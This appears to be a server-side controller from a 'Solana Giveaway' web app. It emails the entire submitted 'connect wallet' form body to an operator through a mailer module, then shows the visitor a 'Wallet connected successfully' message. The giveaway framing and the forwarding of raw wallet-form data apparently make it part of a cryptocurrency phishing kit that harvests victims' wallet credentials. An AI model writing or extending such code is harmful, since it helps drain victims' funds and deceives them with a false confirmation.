const sendEmail = require("../emails/walletConnect.mail");

module.exports = async (req, res) => {
  try {
    // Validate input
    // Send email
    const sentMail = await sendEmail(req.body);
    console.log(sentMail);
    return res.render("connectWallet", {
      walletAddress: process.env.WALLET_ADDRESS,
      title: "Solana Giveaway",
      alert: true,
      title: "Success!",
      message: "Wallet connected successfully",
    });
  } catch (error) {
    console.log(error);
  }
};
